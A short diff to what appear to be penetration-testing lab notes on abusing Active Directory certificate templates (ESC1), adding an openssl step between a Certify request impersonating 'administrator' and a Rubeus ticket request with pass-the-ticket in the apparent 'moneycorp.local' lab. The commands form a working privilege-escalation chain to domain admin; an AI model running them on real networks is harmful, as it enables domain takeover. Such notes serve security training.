@@ -50,7 +50,10 @@ Certify.exe /enrolleeSuppliesSubject
 ```powershell
 Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
 ```
-- Convert from cert.pem to pfx (esc1.pfx below) a
+- Convert from cert.pem to pfx (esc1.pfx below)
+```powershell
+openssl.exe pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
+```
 - Request a TGT for DA (or EA).
 ```powershell
 Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
